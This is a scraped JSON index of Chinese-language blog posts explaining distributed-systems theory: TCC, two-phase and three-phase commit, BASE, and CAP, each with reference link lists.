Confirm操作要满足幂等性 Cancel: 取消执行业务 释放Try阶段预留的业务资源 Cancel操作要满足幂等性 这种类型和可补偿操作类似，就是提供一种提交和回滚的机制。是一种典型的两阶段类型的操作。这里说的两阶段类型操作并不是指2PC，他和2PC还是有区别的。 Reference 分布式理论(三) - 2PC协议 - https://juejin.im/post/5b2664446fb9a00e4a53136e 关于分布式事务、两阶段提交协议、三阶提交协议 - http://www.hollischuang.com/archives/681 理解分布式事务的两阶段提交2pc - http://xiaorui.cc/2016/02/25/%E7%90%86%E8%A7%A3%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E7%9A%84%E4%B8%A4%E9%98%B6%E6%AE%B5%E6%8F%90%E4%BA%A42pc/ 如何用消息系统避免分布式事务？ - http://blog.jobbole.com/89140/ Wikipedia Two-phase commit protocol - https://en.wikipedia.org/wiki/Two-phase_commit_protocol 分布式事务：两阶段提交与三阶段提交 - https://my.oschina.net/wangzhenchao/blog/736909 Wikipedia Three-phase commit protocol - https://en.wikipedia.org/wiki/Three-phase_commit_protocol 深入理解分布式系统的2PC和3PC - https://www.hollischuang.com/archives/1580 2PC和3PC一点理解 - http://jianbeike.blogspot.com/2016/04/2pc3pc.html 再谈2PC和3PC - https://yq.aliyun.com/articles/5854 对分布式事务及两阶段提交、三阶段提交的理解 - https://www.cnblogs.com/binyue/p/3678390.html 大规模SOA系统中的分布事务处事 程立 - https://wenku.baidu.com/view/be946bec0975f46527d3e104.html 常用的分布式事务解决方案 - https://juejin.im/post/5aa3c7736fb9a028bb189bca 再有人问你分布式事务，把这篇扔给他 - https://juejin.im/post/5b5a0bf9f265da0f6523913b","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Distributed System】分布式事务 - 三阶段提交","date":"2019-01-09T08:04:36.000Z","path":"2019/01/09/【Distributed-System】分布式事务-三阶段提交/","text":"三阶段提交（Three-phase Commit）由于二阶段提交存在着诸如同步阻塞、单点问题、数据不一致等缺陷。所以，研究者们在二阶段提交的基础上做了改进，提出了三阶段提交。 三阶段提交（Three-phase commit，3PL），也叫三阶段提交协议（Three-phase commit protocol），是二阶段提交（2PC）的改进版本。 与两阶段提交不同的是，三阶段提交有两个改动点： 引入超时机制 - 同时在协调者和参与者中都引入超时机制。这保证了参与者的事务锁在指定时间后会被自动释放（release），从而避免了因锁长期被占用导致查询性能下降的情况 把两阶段提交协议的第一个阶段拆分成了两个独立的节点（CanCommit 和 PreCommit），以保证在最后提交阶段之前，各参与节点的状态是一致的。 所谓的三个阶段分别是：询问，锁定资源，真正提交。 第一阶段：CanCommit 第二阶段：PreCommit 第三阶段：DoCommit 三阶段提交的过程 阶段一：CanCommit事务询问3PC 的 CanCommit 阶段其实和2PC的准备阶段（Prepare Phase）很像，即协调者向参与者发送 commit 请求，以询问是否可以执行事务提交操作。 但与 2PC 中的准备阶段存在区别的是， 3PC的 CanCommit 阶段并不真正 commit。 响应反馈参与者接到 CanCommit 请求之后，正常情况下，如果其自身认为可以顺利执行事务，则返回 Yes 响应，并进入预备状态；否则反馈 No。 阶段二：PreCommit协调者在得到所有参与者的响应之后，会根据其响应结果执行下面任一一种操作： 执行事务预提交 中断事务。 情况1 执行事务预提交a. 协调者发送预提交请求 协调者向所有参与者节点发出 preCommit 的请求，并进入prepared 状态。 b. 参与者事务预提交 参与者受到 preCommit 请求后，会执行事务操作，对应 2PC 准备阶段中的 “执行事务”，也会 Undo 和 Redo 信息记录到本地的事务日志中。 c. 各参与者响应反馈 如果参与者成功执行了事务，就反馈 ACK 响应，同时等待指令：提交（commit） 或终止（abort）。 情况2 中断事务a. 协调者发送中断请求 协调者向所有参与者节点发出 abort 请求 。 b. 参与者中断事务 参与者如果收到 abort 请求或者超时了，都会中断事务。 阶段三：DoCommit该阶段进行真正的（参与者本地）事务提交，具体分为以下两种情况： 执行提交 中断事务 情况1 执行提交a. 协调者发送提交请求 协调者在接收到各参与者发送的 ACK 响应后，他将从预提交状态（PreCommit）进入到提交状态（DoCommit）。并向所有参与者发送 doCommit 请求。 b. 参与者事务提交 参与者接收到 doCommit 请求之后，执行正式的本地事务提交。并在完成事务提交之后释放所有事务资源。 c. 参与者响应反馈 参与者的本地事务提交完之后， 参与者向协调者发送 ACK 响应。 d. 完成事务 协调者接收到所有参与者的 ACK 响应之后，完成事务。 情况2 中断事务如果协调者没有接收到参与者发送的 ACK 响应（可能是接受者发送的不是ACK响应，也可能响应超时），那么就会执行中断事务。 a. 协调者发送中断请求 协调者向所有参与者发送 rollback 请求。 b. 参与者事务回滚 参与者接收到 rollback 请求之后，利用其在PreCommit阶段记录的 undo 信息来执行事务的回滚操作，并在完成回滚之后释放所有的事务资源。 c. 参与者反馈结果 参与者完成事务回滚之后，向协调者发送 ACK 消息。 d. 协调者中断事务 协调者接收到参与者反馈的 ACK 消息之后，完成事务的中断。 3.1. 三阶段提交的优点相对于二阶段提交，三阶段提交主要解决的单点故障问题，并减少了阻塞的时间。 因为一旦参与者无法及时收到来自协调者的信息，他会默认执行 commit。而不会一直持有事务资源并处于阻塞状态。 但是这种机制也会导致数据一致性问题，因为，由于网络原因，协调者发送的 abort 响应没有及时被参与者接收到，那么参与者在等待超时之后执行了 commit 操作。这样就和其他接到 abort 命令并执行回滚的参与者之间存在数据不一致的情况。 三阶段提交的缺点三阶段提交也会导致数据一致性问题。由于网络原因，协调者发送的 abort 响应没有及时被参与者接收到，那么参与者在等待超时之后执行了 commit 操作。 这样就和其他接到 abort 命令并执行回滚的参与者之间存在数据不一致的情况。 Reference 分布式理论(三) - 2PC协议 - https://juejin.im/post/5b2664446fb9a00e4a53136e 关于分布式事务、两阶段提交协议、三阶提交协议 - http://www.hollischuang.com/archives/681 理解分布式事务的两阶段提交2pc - http://xiaorui.cc/2016/02/25/%E7%90%86%E8%A7%A3%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E7%9A%84%E4%B8%A4%E9%98%B6%E6%AE%B5%E6%8F%90%E4%BA%A42pc/ 如何用消息系统避免分布式事务？ - http://blog.jobbole.com/89140/ Wikipedia Two-phase commit protocol - https://en.wikipedia.org/wiki/Two-phase_commit_protocol 分布式事务：两阶段提交与三阶段提交 - https://my.oschina.net/wangzhenchao/blog/736909 Wikipedia Three-phase commit protocol - https://en.wikipedia.org/wiki/Three-phase_commit_protocol 深入理解分布式系统的2PC和3PC - https://www.hollischuang.com/archives/1580 2PC和3PC一点理解 - http://jianbeike.blogspot.com/2016/04/2pc3pc.html 再谈2PC和3PC - https://yq.aliyun.com/articles/5854 对分布式事务及两阶段提交、三阶段提交的理解 - https://www.cnblogs.com/binyue/p/3678390.html","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Distributed System】分布式事务 - 两阶段提交","date":"2019-01-09T07:57:34.000Z","path":"2019/01/09/【Distributed-System】分布式事务=两阶段提交/","text":"分布式一致性回顾在分布式系统中，为了保证数据的高可用，通常，我们会将数据保留多个副本（replica），这些副本会放置在不同的物理的机器上。为了对用户提供正确的增\\删\\改\\查等语义，我们需要保证这些放置在不同物理机器上的副本是一致的。 为了解决这种分布式一致性问题，前人在性能和数据一致性的反反复复权衡过程中总结了许多典型的协议和算法。其中比较著名的有二阶提交协议（Two-phase Commit Protocol）、三阶提交协议（Three-phase Commit Protocol）和Paxos算法。 什么是两阶段提交（Two-phase commit，2PC）两阶段提交（Two-phase commit，2PC）是指，在计算机网络以及数据库领域内，为了使基于分布式系统架构下的所有节点在进行事务提交时，保持一致性而设计的一种算法（Algorithm）。 通常，两阶段提交也被称为是一种协议（Protocol），称为二阶提交协议（Two-phase commit Protocol）。二阶提交协议是一种原子提交协议（Atomic commitment protocol, ACP）。 在分布式系统中，每个节点虽然可以知晓自己的操作时成功或者失败，却无法知道其他节点的操作的成功或失败。当一个事务跨越多个节点时，为了保持事务的ACID特性，需要引入一个作为协调者（Coordinator）的组件来统一管理所有节点（每个节点均是一个事务参与者（Participant））的操作结果，并最终指示这些节点是否要把操作结果进行真正的提交（比如将更新后的数据写入磁盘）。 因此，二阶段提交的算法思路可以概括为：参与者将操作成败通知协调者，再由协调者根据所有参与者的反馈情报决定各参与者是否要进行提交（Commit）操作还是回滚（Rollback）操作。 两阶段提交的过程两阶段提交包含事务协调者（Transaction Coordinator）和若干事务参与者（Transaction Participant）两种角色。 这里的事务参与者就是具体的数据库，抽象点可以说是可以控制给数据库的程序。 事务协调者可以和事务参与者在一台机器上。 所谓的两个阶段是指准备阶段（Prepare Phase）和提交阶段（Commit Phase）： 准备阶段（Prepare Phase） 准备阶段（Prepare Phase），又称为投票阶段（Voting Phase）。 在这一阶段，协调者通过向所有参与者发送 query to commit 消息以询问所有参与者是否准备好提交，此后： 如果某个参与者在执行本地的事务的过程中没有出现异常，则向协调者回复一条 agreement 消息（其中标识了 Prepared）； 如果某个参与者在执行本地事务的过程中出现了异常，则回复一条 agreement 消息（其中标识了 Abort）。 提交阶段（Commit Phase）提交阶段（Commit Phase）也称为完成阶段（Completion Phase）。 如果协调者在上一阶段收到所有参与者回复（的 agreement 消息中）的 Prepared，则向所有参与者发送 commit 命令，否则协调者会向所有参与者发送 rollback 命令。 协调者向所有参与者发送 commit 命令 如参与者收到了 commit 命令，其会释放本地事务过程中持有的锁和其他资源，并将事务在本地提交（持久化一条commit日志）。然后向协调者发送 acknowledgement 命令以标志操作成功； 最终，如果协调者收到了所有参与者回复的 acknowledgement 消息，协调者完成该事务，并向客户端返回事务成功消息。 协调者向所有参与者发送 rollback 命令 在准备阶段（Prepare Phase）中，若任何一个参与者回复No或超时未应答，协调者会先在本地持久化事务状态，并向所有参与者发送 rollback 命令； 参与者收到 rollback 命令后，会回滚事务（有必要的情况下还要持久化一条 abort 日志），并释放本地资源和锁。最终，向协调者发送 acknowledgement 消息以表示 rollback 成功； 当协调者收到所有参与者回复的 acknowledgement 消息后，协调者取消该事务，并向客户端返回事务失败消息。 一个例子 我们设想从支付宝里转10000元到余额宝的场景…… 首先我们的应用程序发起一个请求到事务协调者（Transaction Coordinator），然后由事务协调者来保证分布式事务。 准备阶段（Prepare Phase） ： 协调者先将 prepare 消息写到本地日志。 向所有的参与者（事务执行器）发起 prepare 消息。以支付宝转账到余额宝为例，协调器给参与者 A 的 prepare 消息，是通知支付宝数据库相应账目扣款 10000，协调者给 参与者 B 的 prepare 消息是通知余额宝数据库相应账目增加 10000。 参与者收到 prepare 消息后，执行本机事务，如果本地事务成功则向协调者返回 Prepared ，不成功则返回 About 。同理，返回前，参与者将操作写入日志，当作凭证。 提交阶段（Commit Phase）：协调者收集所有参与者返回的消息， 如果所有参与者都返回 Prepared ，协调者会给所有参与者发送 commit 消息，参与者收到 commit 后，将执行本地事务的 commit 操作，并返回 acknowledgement 消息给协调者； 如果有任一个参与者返回 About ，协调者会给所有参与者发送 rollback 消息，参与者收到 rollback 消息后执行本地事务的 rollback操作，并返回确认消息给协调者。 协调者将操作写入日志，并最终返回结果给客户端。 为什么在执行任务前需要先写本地日志，主要是为了故障后恢复用，本地日志起到现实生活中凭证的效果，如果没有本地日志（凭证），出现问题后容易发生死无对证的情况。 两阶段提交的容错方式两阶段提交（2PC）在执行过程中，可能发生协调者或者参与者突然宕机的情况，同时，在不同时期的宕机可能会出现不同的情况。 情况一：协调者宕机，参与者正常这种情况其实比较好解决，只要找一个协调者的替代者。当它成为新的协调者的时候，询问所有参与者本地事务的执行情况，它就能够知道当前事务处于哪个状态。 所以，这种情况不会导致数据不一致。 情况二：参与者宕机，协调者正常这种情况其实也比较好解决。如果协调者宕机了。那么之后的事情有两种情况： 第一个是参与者宕机后，在一段时间后也没有被恢复。这种情况下，协调者会通知所有参与者 rollback， 因此不会导致数据一致性问题。 第二个是宕机之后又恢复了，这时如果这个参与者有未执行完的事务操作，则直接取消掉，然后询问协调者目前应该进行什么操作，协调者就会比对自己的事务执行记录和该参与者的事务执行记录，并告诉这个参与者应该执行什么操作，来保持数据的一致性。 情况三：参与者宕机，协调者也宕机这种情况比较复杂，是两阶段提交无法完美解决的情况。 我们分别进行讨论。 协调者和参与者在准备阶段（第一阶段）宕机了。 由于这时还没有执行 commit 操作，新选出来的协调者可以询问各个参与者的情况，再决定是进行 commit 还是 rollback 。因为还没有 commit ，所以不会导致数据一致性问题。 协调者和参与者在提交阶段（第二阶段）宕机了，宕机了的这个参与者，在宕机之前并没有接收到协调者的指令，或者接收到指令之后，还没来的及做 commit 或者 rollback 操作。 这种情况下，当新的协调者被选出来之后，它同样是询问所有的参与者的情况。只要有参与者执行了 rollback 操作或者在第一阶段（准备阶段）返回的信息是 Abort ，就直接执行 rollback 操作。 如果没有参与者执行 rollback 操作，但是有参与者执行了 commit 操作，那么就直接执行 commit 操作。 这样，当宕机的参与者恢复之后，只要按照协调者的指示，进行事务的 commit 还是 rollback 操作就可以了。因为宕机的参与者并没有做 commit 或者 rollback 操作，而且没有宕机的参与者们和新的协调者又执行了同样的操作，因此，这种情况不会导致数据不一致现象。 协调者和参与者在提交阶段（第二阶段）宕机了，宕机的这个参与者在宕机之前已经执行了操作。但是由于它宕机了，因而无法知道它执行了什么操作（ commit or rollback）。 这种情况下，新的协调者被选出来之后，它就只能按照之前那种情况来执行 commit 或者 rollback 操作。这样新的协调者和所有没宕机的参与者就保持了数据的一致性， 我们假定他们执行了 commit。但是，这个时候，那个宕机的参与者恢复了怎么办，因为它之前已经执行完了之前的事务，如果他执行的是 commit 那还好，因为和其他的参与者保持一致了。可是，如果它执行的是 rollback 操作时，就导致数据的不一致。 虽然这个时候，理论上可以再通过手段让它和协调者通信，以实现数据一致性，但是，这段时间内它的数据状态已经是不一致的了！ 所以，2PC协议中，如果出现协调者和参与者都宕机了的情况，有可能导致数据不一致。 两阶段提交的优缺点优点原理简单，易于实现。 缺点由于两阶段协议是一个阻塞式协议（blocking protocol）。其缺点也显而易见，在参与者发送 agreement 消息给协调者后，它会被阻塞，直到协调者回复 commit 或者 rollback 。因此，系统的吞吐率（throughput）较低。 具体可归纳为以下几个： 单点问题 协调者在整个两阶段提交过程中扮演着举足轻重的作用，一旦协调者宕机，那么就会影响整个分布式系统的正常运行，比如在第二阶段中，如果协调者因为故障不能正常发送事务提交或回滚通知，那么参与者们将一直处于阻塞状态，因而整个系统将无法提供服务。 当然，我们可以通过 watchdog 实时监测协调者的状态。当出现协调者宕机时，立即引入一个新的协调者接管这个事务。 同步阻塞 两阶段提交执行过程中，所有的参与者都需要听从协调者的统一调度，期间处于阻塞状态而不能从事其他操作，这样效率较为低下。 数据不一致性 两阶段提交协议虽然为分布式数据强一致性所设计，但仍然存在数据不一致性的可能，比如在第二阶段中，假设协调者发出了事务 commit 的通知，但是因为网络问题该通知仅被一部分参与者所收到并执行了 commit 操作，其余的参与者则因为没有收到通知一直处于阻塞状态，这时候就产生了数据的不一致性。 正是由于分布式事务存在很严重的性能问题，大部分高并发服务都在避免使用两阶段提交，而往往通过其他途径来解决数据一致性问题。 Reference 分布式理论(三) - 2PC协议 - https://juejin.im/post/5b2664446fb9a00e4a53136e Oracle Two-Phase Commit Mechanism - https://docs.oracle.com/cd/B28359_01/server.111/b28310/ds_txns003.htm#ADMIN12222 Two-phase commit protocol - https://shekhargulati.com/2018/09/05/two-phase-commit-protocol/ 关于分布式事务、两阶段提交协议、三阶提交协议 - http://www.hollischuang.com/archives/681 理解分布式事务的两阶段提交2pc - http://xiaorui.cc/2016/02/25/%E7%90%86%E8%A7%A3%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E7%9A%84%E4%B8%A4%E9%98%B6%E6%AE%B5%E6%8F%90%E4%BA%A42pc/ 如何用消息系统避免分布式事务？ - http://blog.jobbole.com/89140/ Wikipedia Two-phase commit protocol - https://en.wikipedia.org/wiki/Two-phase_commit_protocol 分布式事务：两阶段提交与三阶段提交 - https://my.oschina.net/wangzhenchao/blog/736909 Wikipedia Three-phase commit protocol - https://en.wikipedia.org/wiki/Three-phase_commit_protocol 深入理解分布式系统的2PC和3PC - https://www.hollischuang.com/archives/1580 2PC和3PC一点理解 - http://jianbeike.blogspot.com/2016/04/2pc3pc.html 再谈2PC和3PC - https://yq.aliyun.com/articles/5854","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Distributed System】分布式理论 - BASE理论","date":"2019-01-08T09:50:28.000Z","path":"2019/01/08/【Distributed-System】分布式理论-BASE理论/","text":"BASE理论eBay 的架构师 Dan Pritchett 源于对大规模分布式系统的实践总结，在 ACM 上发表文章提出 BASE 理论，BASE 理论是对 CAP 理论的延伸，核心思想是：即使无法做到强一致性（Strong Consistency），CAP 的一致性就是强一致性），但每个应用都可以根据自身的业务特点，采用适合的方式来达到最终一致性（Eventual Consitency）。 BASE 是指基本可用（Basically Availability）、软状态（ Soft State）、最终一致性（ Eventual Consistency）。 基本可用（Basically Availability）基本可用是指分布式系统在出现故障的时候，允许损失部分可用性，即保证核心可用。 损失部分可用性可体现为： 响应时间上的损失：正常情况下的搜索引擎 0.5 秒即返回给用户结果，而基本可用的搜索引擎可以在2秒后返回结果。 功能上的损失：在一个电商网站上，正常情况下，用户可以顺利完成每一笔订单。但是到了大促期间，为了保护购物系统的稳定性，部分消费者可能会被引导到一个降级页面。 软状态（Soft-State）相对于 ACID 中的原子性（Atomicity）而言，要求多个节点的数据副本都是一致的，这是一种“硬状态”。 而软状态（Soft-State）是指允许系统存在中间状态，而该中间状态不会影响系统整体可用性，最终数据会保证最终一致性。 比如，数据库读写分离，写库同步到读库（主库同步到从库）会有一个延时，这样实际是一种柔性状态。 最终一致性（ Eventual Consistency）上面说软状态，然后不可能一直是软状态，必须有个时间期限。在期限过后，应当保证所有副本保持数据一致性，从而达到数据的最终一致性（ Eventual Consistency）。这个时间期限取决于网络延时、系统负载、数据复制方案设计等等因素。 弱一致性和强一致性相反，最终一致性是弱一致性的一种特殊情况。 ACID 和 BASE 的区别与联系 ACID 和 BASE 代表了两种截然相反的设计哲学，而 CAP 也正是 ACID 和 BASE 长期博弈（trade off）的结果。 ACID 是传统数据库常用的设计理念，追求强一致性模型。因此 ACID 伴随数据库的诞生定义了系统基本设计思路， 2000年左右，随着互联网的发展，高可用的话题被摆上桌面，所以提出了 BASE ，即通过牺牲强一致性获得高可用性。从此 C 和 A 的取舍消长此起彼伏，其结晶就是 CAP 理论。 在高可用与高性能的应用场景，分布式事务的最佳实践是放弃 ACID，遵循 BASE 的原则重构业务流程。 CAP 并不与 ACID 中的 A（原子性）冲突，值得讨论的是 ACID 中的 C（一致性）和 I（隔离性）。ACID 的 C 指的是事务不能破坏任何数据库规则，如键的唯一性。与之相比，CAP 的 C 仅指单一副本这个意义上的一致性，因此 CAP 的 C 只是 ACID 一致性约束的一个严格的子集。 如果系统要求 ACID 中的 I （隔离性），那么它在分区期间最多可以在分区一侧维持操作。事务的可串行性（serializability）要求全局的通信，因此在分区的情况下不能成立。 Reference 一文带你重新审视CAP理论与分布式系统设计 - https://dbaplus.cn/news-159-1917-1.html 分布式理论(二) - BASE理论 - https://juejin.im/post/5b2663fcf265da59a401e6f8","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Distributed System】分布式理论 - CAP理论","date":"2019-01-08T04:48:56.000Z","path":"2019/01/08/【Distributed-System】分布式理论-CAP理论/","text":"背景2000年7月，加州大学伯克利分校的Eric Brewer教授在ACM PODC会议上提出CAP猜想。2年后，麻省理工学院的Seth Gilbert和Nancy Lynch从理论上证明了CAP。之后，CAP理论正式成为分布式计算领域的公认定理。 概述 CAP理论：一个分布式系统最多只能同时满足一致性（Consistency）、可用性（Availibility）和分区容错性（Partition tolerance）这三项中的两项。 需要注意的的是，CAP理论中的CA和数据库事务中ACID的CA并完全不是同一回事儿。两者之中的C都是都是一致性(Consistency)。然而，CAP中的A指的是可用性（Availability），而ACID中的A指的是原子性（Atomicity)，切勿混为一谈。 一致性（Consistency）一致性（Consistency）是指 “all nodes see the same data at the same time”， 即当某个逻辑操作完成后，对于该操作所涉及的所有数据，在同一时间所有节点中存储的数据应该是完整且完全一致的。 在分布式系统中，数据通常不会只有一份，当用户对数据进行了一定的修改操作（增、删、改）后，为了保证数据的一致性，应该对所有操作进行相同的操作并且这些操作应该是同时成功或者同时失败的。如果一个存储系统是保证一致性的，那么用户读到的数据就一定是最新的（而不会发生两个不同的用户在同一时间在不同的存储节点中，读取得到不同副本的的情况）。 事实上，对于一致性，可以分为从客户端和服务端两个不同的视角： 从客户端来看，一致性主要指的是当多个用户对特定数据进行并发访问或操作时，不同的用户获取的数据是不是最新的。 从服务端来看，则是如何将对数据的更新同步到系统中的其他节点中，以保证数据一致（或最终一致）。 一致性是因为有并发读写才有的问题，因此在理解一致性的问题时，一定要注意结合考虑并发读写的场景。 可用性（Availability）可用性（Availability）是指“Reads and writes always succeed”，即用户在访问数据时可以得到及时的响应，而无论当前是否存在操作冲突，或者软硬件升级。 可用性并不意味着数据的一致性，比如读取到的数据是过期数据或脏数据，这时对用户来说，是有及时响应的，因此仍然认为是（该系统）具有可用性； 可用性意味着时效性，因为可用性要求“及时”的响应。因为对于大部分应用而言，超过一定相应时间的服务是没有意义的。 对于一个可用性的分布式系统，每一个非故障的节点必须对每一个请求作出响应。所以，一般我们在衡量一个系统的可用性的时候，都是通过停机时间来计算的。 可用性分类 可用水平（%） 年可容忍停机时间 容错可用性 99.9999 &lt;1 min 极高可用性 99.999 &lt;5 min 具有故障自动恢复能力的可用性 99.99 &lt;53 min 高可用性 99.9 &lt;8.8h 商品可用性 99 &lt;43.8 min 通常我们描述一个系统的可用性时，我们说淘宝的系统可用性可以达到5个9，意思就是说他的可用水平是99.999%，即全年停机时间不超过 (1-0.99999)*365*24*60 = 5.256 min，这是一个极高的要求。 分区容错性（Partition Tolerance） 分区容错性（Partition Tolerance）是指“The system continues to operate despite an arbitrary number of messages being dropped (or delayed) by the network , or between nodes”，即分布式系统在遇到在网络传输过程中数据丢失（或延迟），或部分节点无法工作时，仍能够对外提供服务。 换句话说，我们在设计分布式系统时，必须考虑到可能出现在网络传输过程中数据丢失（或延迟），或者部分节点无法工作的情况。通常的做法，是将一个数据记录（data records）复制多份到多个节点中。 我们必须容忍（tolerate）在分布式系统中出现的网络传输数据丢失或延迟。如果我们选择不容忍这种数据丢失或延迟，则意味着我们必须要通过某种机制避免网络传输数据丢失或延迟，显然，这是不可能实现的。 值得说明的是，CAP 理论是在分布式系统的上下文讨论的，而分布式系统必须依赖于网络传输。只要有网络传输，就一定会出现数据丢失或延迟的情况。换句话说，数据丢失或延迟是必须要忍受的（因为我们无法避免它的出现）。因而，对于一个分布式系统，分区容错性（Partition Tolerance）是一定满足的。 因此，若舍弃掉了 CAP 中的 P（Partition Tolerance），则意味着分区容错性不满足。要保证不出现网络传输数据丢失或延迟，唯一的方法就是不使用网络传输，这时分布式系统也就没有意义了（因为分布式系统必须基于网络构建）。 因此，CAP 三者地位并不平等：P（Partition Tolerance） 是基础（或者说 P 是一定满足的），在 C （Consistency） 和 A （Availability） 之间需要进行权衡。 三种一致性策略对一致性进行细分，具体包括三种一致性策略： 强一致性（Strong Consistency） 弱一致性（Weak Consistency） 最终一致性（Eventual Consistency） CAP中说的不可能同时满足的这个一致性指的是强一致性（Strong Consistency）。 强一致性（Strong Consistency） 对于关系型数据库，要求更新过的数据能被后续的访问都能看到，这是强一致性。 弱一致性（Weak Consistency） 系统在数据写入成功之后，不承诺立即可以读到最新写入的值，也不会具体的承诺多久之后可以读到。但会尽可能保证在某个时间级别（比如秒级别）之后，可以让数据达到一致性状态。 因此，弱一致性一般是最终一致性。因为若在超过在某个时间级别之后，数据仍不具有一致性，则在某种程度上可以认为这个系统是没有意义的。 最终一致性（Eventual Consistency） 弱一致性的特定形式。如果经过一段时间后要求能访问到更新后的数据，则是最终一致性。 DNS 服务是最终一致性（Eventual Consistency）的一个典型例子。 最终一致性模型的变种因果一致性 在满足因果一致性的系统中，与写进程具有因果关系的进程将会获得被写操作更新的数据，写进程保证取代上次更新。 如果A进程在更新之后向B进程通知更新的完成，那么B的访问操作将会返回更新后的值。对于没有因果关系的C进程将会遵循最终一致性的规则。 读己所写一致性 读己所写一致性是因果一致性的特定形式。进程总可以获取到自己上次更新写入的值。 会话一致性 会话一致性是读己所写一致性的特定形式。在访问存储系统同一个会话内的不同进程，都会获取到上次更新写入的值。 单调读一致性 如果一个进程已经读取到一个特定值，那么该进程不会读取到该值以前的任何值。 单调写一致性 系统保证同一个进程写入操作的串行化。对于多副本系统来说，保证写顺序的一致性（串行化），是很重要的。 证明我们以一个小例子来证明， C （Consistency） 和 A （Availability） 之间不能同时满足。 最初，一个客户端请求 G1 节点 将变量 v 更新为 v1（写请求），这个变量的初始值为 v0。由于系统是可用的，G1 会做出回应（修改变量值，并告知客户端操作完成）。由于系统是可以忍受分区（满足 P ）的，因而因为网络传输原因， G1 节点无法正常复制数据到 G2 节点上。 接下来，客户端向 G2 节点发出一个读请求。由于系统是可用的，G2 会做出回应（返回 v 变量的值，且值为 v0），因为由于网络传输原因， G1 节点无法正常复制数据到 G2 节点上。 一致性（Consistency）要求，当某个逻辑操作完成后，对于该操作所涉及的所有数据，在同一时间所有节点中存储的数据应该是完整且完全一致的。 在这个例子中，客户端向 G1 节点写入了新值 v1，而却在 G2节点中获取了旧的值 v0。因此，这个系统并不满足一致性（Consistency）。 若这个系统选择保证一致性（Consistency），当网络传输问题发生时，则无法实现 G1 和 G2 节点之间的数据同步操作。最终，当客户端请求 G2 节点时，G2 节点因为无法完成数据同步，因而无法向客户端提供最新的值，最终不会向客户端做出回应，因此系统并不满足可用性（Availability）。 CAP的权衡通过CAP理论及前面的证明，我们知道一个分布式系统是无法同时满足一致性、可用性和分区容错性这三个特性，那要舍弃哪个呢？ 我们分三种情况来讨论。 CA without P - 放弃分区容错性（Partition Tolerance）这种情况在分布式系统中是不存在的。 上文也提到了，在分布式环境下，在网络传输过程中数据的丢失和延迟是无法被完成避免的，因而网络分区（network partition）是必须要被容忍的（即 CAP 中的 P 必须被满足）。 所以如果舍弃P，意味着要舍弃分布式系统。那也就没有必要再讨论CAP理论了。 比如我们熟知的关系型数据库，如 MySQL 和 Oracle 就是保证了可用性和数据一致性，但是它只是个单机系统，并不是个分布式系统。一旦关系型数据库要考虑主备同步、集群部署等，就必须要把P也考虑进来。 总结来说，对于一个分布式系统来说。P是一个基本要求，CAP三者中，只能在CA两者之间做权衡，并且要想尽办法提升P。 在《Spanner, TrueTime and the CAP Theorem》中，Eric提到，从Google的经验中可以得到的结论是，无法通过降低CA来提升P。要想提升系统的分区容错性，需要通过提升基础设施的稳定性来保障，而不是通过降低C和A来获得的。 CP without A - 强一致系统（High Consistency） 强一致系统（High Consistency）意味着在任何时间向任何节点（nodes）获取数据都会得到相同的结果。换句话说，向任何一个节点执行一个读操作都会返回相同的值，而且是最新写入的那个值。 如果一个分布式系统不要求强的可用性，即容许系统停机或者长时间无响应的话，就可以在CAP三者中保障CP而舍弃A。 一个保证了CP而一个舍弃了A的分布式系统，一旦发生网络故障或者消息丢失等情况，就要牺牲用户的体验，等待所有数据全部一致了之后再让用户访问系统。 设计成CP的系统其实也不少，其中最典型的就是很多分布式数据库，他们都是设计成CP的。在发生极端情况时，优先保证数据的强一致性，代价就是舍弃系统的可用性。如MongoDB、Redis、HBase等，还有分布式系统中常用的Zookeeper也是在CAP三者之中选择优先保证CP的。 复制同步的协议一般使用严格的法定数协议（Paxos、Raft、ZAB）或者2PC协议。 AP wihtout C - 高可用系统（High Availability） 要高可用并允许分区，则需放弃一致性。一旦网络问题发生，节点之间可能会失去联系。为了保证高可用，需要在用户访问时可以马上得到返回，则每个节点只能用本地数据提供服务，而这样会导致全局数据的不一致性。 这种舍弃强一致性而保证系统的分区容错性和可用性的场景和案例非常多，比如 Couch DB、Cassandra、Amazon Dynamo等。前面我们介绍可用性的时候说到过，很多系统在可用性方面会做很多事情来保证系统的全年可用性可以达到N个9，所以，对于很多业务系统来说，比如淘宝的购物，12306的买票。都是在可用性和一致性之间舍弃了一致性而选择可用性。 再比如，发布一张网页到 CDN，多个服务器有这张网页的副本。后来发现一个错误，需要更新网页，这时只能每个服务器都更新一遍。 一般来说，网页的更新不是特别强调一致性。短时期内，一些用户拿到老版本，另一些用户拿到新版本，问题不会特别大。当然，所有人最终都会看到新版本。所以，这个场合就是可用性高于一致性。 AP系统使用的复制同步协议一般使用非严格的法定数协议。 你在12306买票的时候肯定遇到过这种场景，当你购买的时候提示你是有票的（但是可能实际已经没票了），你也正常的去输入验证码，下单了。但是过了一会系统提示你下单失败，余票不足。这其实就是先在可用性方面保证系统可以正常的服务，然后在数据的一致性方面做了些牺牲，会影响一些用户体验，但是也不至于造成用户流程的严重阻塞。 但是，我们说很多网站牺牲了一致性，选择了可用性，这其实也不准确的。就比如上面的买票的例子，其实舍弃的只是强一致性。退而求其次保证了最终一致性。也就是说，虽然下单的瞬间，关于车票的库存可能存在数据不一致的情况，但是过了一段时间，还是要保证最终一致性的。 